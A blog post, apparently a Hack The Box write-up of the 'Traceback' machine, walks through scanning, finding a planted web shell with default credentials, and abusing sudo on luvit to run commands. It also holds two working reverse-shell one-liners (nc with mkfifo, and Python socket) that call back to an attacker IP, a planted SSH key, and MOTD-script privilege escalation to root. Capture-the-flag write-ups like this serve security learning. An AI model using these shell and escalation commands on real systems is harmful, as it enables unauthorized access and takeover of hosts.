---
layout: post
title:  "Hack The Box - Traceback"
date:   2020-08-16 13:31:00 +0800
categories: hackthebox windows lua motd
---

![](/assets/images/traceback.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.181 traceback.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC traceback.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 07:47 EDT
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.0056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds

{% endhighlight %}

# Enumeration (1)

Not much can be done with the `ssh` service on port `22`, so lets start with the `http` service on port `80`!

![](/assets/images/traceback1.png)

By viewing the source, we see something interesting.

{% highlight html %}
<center>
        <h1>This site has been owned</h1>
        <h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
        <h3> - Xh4H - </h3>
        <!--Some of the best web shells that you might need ;)-->
</center>
{% endhighlight %}

The website has already been pwned? And what is with that comment? Searching "Some of the best web shells that you might need", I came across a [repo](https://github.com/Xh4H/Web-Shells) that was forked by `Xh4H`, which seems by the one that pwned the website.

In the repo was a list of ready-to-use web shells so I guess he must have uploaded one of this. Since the list was quite short, I manually tested each file and found that `smevk.php` existed on the web server.

`http://traceback.php/smevk.php`:

![](/assets/images/traceback2.png)

According to the source code in the repo, the username and password were both `admin`.

{% highlight php %}
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
{% endhighlight %}

After logging in, we see that the web shell is packed with many features such as file upload, command execution etc.

![](/assets/images/traceback3.png)

Using the command execution feature, I listed the home directories of users:

{% highlight bash %}
$ ls /home
sysadmin
webadmin
{% endhighlight %}

There is another user called `sysadmin` but all we could do is list the contents of `webadmin`'s home directory.

{% highlight bash %}
$ ls -al /home/webadmin
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Aug  2 00:39 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
{% endhighlight %}

There is a `note.txt`! Lets read it.

{% highlight bash %}
$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
{% endhighlight %}

A tool to practice Lua? I wasn't sure what `sysadmin` was talking about but seeing in the home directory of `webadmin`, there was `.luvit_history`, which seems to be out of the norm. Searching online, it belonged to a program called [`Luvit`](https://luvit.io/)!

Running `sudo -l`, we see that we are able to run `luvit` as `sysadmin`.

{% highlight bash %}
$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
{% endhighlight %}

Let see what we can do with it.

{% highlight bash %}
$ sudo -u sysadmin /home/sysadmin/luvit -h
Usage: /home/sysadmin/luvit [options] script.lua [arguments]

  Options:
    -h, --help          Print this help screen.
    -v, --version       Print the version.
    -e code_chunk       Evaluate code chunk and print result.
    -i, --interactive   Enter interactive repl after executing script.
    -n, --no-color      Disable colors.
    -c, --16-colors     Use simple ANSI colors
    -C, --256-colors    Use 256-mode ANSI colors
                        (Note, if no script is provided, a repl is run instead.)
{% endhighlight %}

With the `-e` option, we can run put Lua code and it will run it as `sysadmin`! Since using `luvit` will be similar to using `lua`, I decided to follow [this](https://gtfobins.github.io/gtfobins/lua/#shell) to see if we can run some arbitrary commands.

{% highlight bash %}
$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("id")'
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
true	'exit'	0
{% endhighlight %}

# Exploitation (1)

Nice! We managed to run commands as `sysadmin`. Lets spawn a reverse shell as `sysadmin`! After starting a `nc` listener on port `1337`, I ran the below command:

{% highlight bash %}
$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XX.XX 1337 >/tmp/f")'
{% endhighlight %}

And I receive the connection:

{% highlight bash %}
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54078
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
{% endhighlight %}

# user.txt

With a stable shell, we can now read the user flag.

{% highlight bash %}
$ cat /home/sysadmin/user.txt
7213XXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# Enumeration (2)

I uploaded [`pspy`](https://github.com/DominicBreuker/pspy) to the box and ran it.

{% highlight bash %}
$ wget http://10.10.XX.XX/pspy
--2020-08-02 02:59:49--  http://10.10.XX.XX/pspy
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1090528 (1.0M) [application/octet-stream]
Saving to: 'pspy'
...
2020-08-02 02:59:50 (4.74 MB/s) - 'pspy' saved [1090528/1090528]
$ ./pspy
...
2020/08/02 03:03:01 CMD: UID=0    PID=9977   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
...
{% endhighlight %}

Every now and then, files from `/var/backups/.update-motd.d/` will be copied to `/etc/update-motd.d/`. Hmm lets check what permission we have on these folders.

{% highlight bash %}
$ ls -al /etc/update-motd.d/
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Aug  2 03:26 00-header
-rwxrwxr-x  1 root sysadmin  982 Aug  2 03:26 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Aug  2 03:26 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Aug  2 03:26 80-esm
-rwxrwxr-x  1 root sysadmin  299 Aug  2 03:26 91-release-upgrade
$ ls -al /var/backups/.update-motd.d
total 32
drwxr-xr-x 2 root root 4096 Mar  5 02:56 .
drwxr-xr-x 3 root root 4096 Aug 25  2019 ..
-rwxr-xr-x 1 root root  981 Aug 25  2019 00-header
-rwxr-xr-x 1 root root  982 Aug 27  2019 10-help-text
-rwxr-xr-x 1 root root 4264 Aug 25  2019 50-motd-news
-rwxr-xr-x 1 root root  604 Aug 25  2019 80-esm
-rwxr-xr-x 1 root root  299 Aug 25  2019 91-release-upgrade
{% endhighlight %}

We got write access to `/etc/update-motd.d`! It seems like the scripts in `/etc/update-motd` will be replaced with a clean version every now and then. Lets check if `ssh`ing into the box will cause these scripts to run.

First I generate a `ssh` key-pair.

{% highlight bash %}
$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): traceback/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in traceback/id_rsa.
Your public key has been saved in traceback/id_rsa.pub.
The key fingerprint is:
SHA256:CMKnVhw7VM+I3CeNzdMaP58KKe2K/r2pm585NpE8IcA root@kali
The key's randomart image is:
+---[RSA 3072]----+
|   .o..          |
| . +E= O .       |
|  o X.= X .      |
|   = o.+.=       |
|  o   .oSoo      |
| .     .=. o .   |
|      . +o  o    |
|     . =+= .     |
|   .o.**O+.      |
+----[SHA256]-----+
{% endhighlight %}

Then, I copy the contents of my public key `id_rsa.pub` into `sysadmin`'s `authorized_keys` and `ssh` with the private key.

{% highlight bash %}
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu/dvT4ATAAvV67Dzm8YNMfOzD1np26hbCDYbfgv9vltGcNsjqxw/ZOqiTtl6S88VX/VcmiVmbFB4KTZLFv4Sh+jJF5jhGwHDjE/pB2xNxFeyvr2DNSOU+810XAm15M7sMQUowLzikZgbfc/tYMZ7n8Bkd97smwnsCpS51NQjgOeAAAXmSxeSlHEokH4TFQXC5Xf1ApTnWMgxpf+mM675UQYhpgSA2uc6xjCGUjRJyTPHoItg+DpUytuMliPtgKLXovv7MSMVMbKXcUCv/eUDYYjPUcQc50VqziVAAh1SmBaIRtVu/2+9b4TfpR1YmAfC+ZOSPMbZYzbP2IeSW3/panAFzu/Z/K4t4W8YHU4hpOkm4+70A1+LQqiC/67fwdnWWX3Baw6Is3HDV7Uhsxg4ulFGqSPtdoSQYWir6ToC0eBfFHj05nTrHLi4FuJVQInMdLdErSA6eQpNyYwWYvTMD/l10m1SlV1dupyGSW65y+rbID6EKkR1sGGBTS2RB4eE= root@kali" >> /home/sysadmin/.ssh/authorized_keys
$ ssh -i id_rsa sysadmin@traceback.htb
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
{% endhighlight %}

The line `Welcome to Xh4H land` was from `00-header`! This means that since we can write to it and run any commands!

{% highlight bash %}
$ cat /etc/update-motd.d/00-header
...
echo "\nWelcome to Xh4H land \n"
{% endhighlight %}

# Exploitation (2)

Lets create a `bash` script that connects back to our `nc` listener on port `1338` and add it to `00-header`.

{% highlight bash %}
$ cat /tmp/rev.sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
$ chmod 777 /tmp/rev.sh
$ echo "/tmp/rev.sh" >> /etc/update-motd.d/00-header
{% endhighlight %}

And lastly, we simply start another `ssh` connection.

{% highlight bash %}
$ ssh -i id_rsa sysadmin@traceback.htb
{% endhighlight %}

# root.txt

On our listener, we catch the connection and get the root flag.

{% highlight bash %}
$ nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54618
root@traceback:/# cat /root/root.txt
05acXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

Rooted ! Thank you for reading and look forward for more writeups and articles !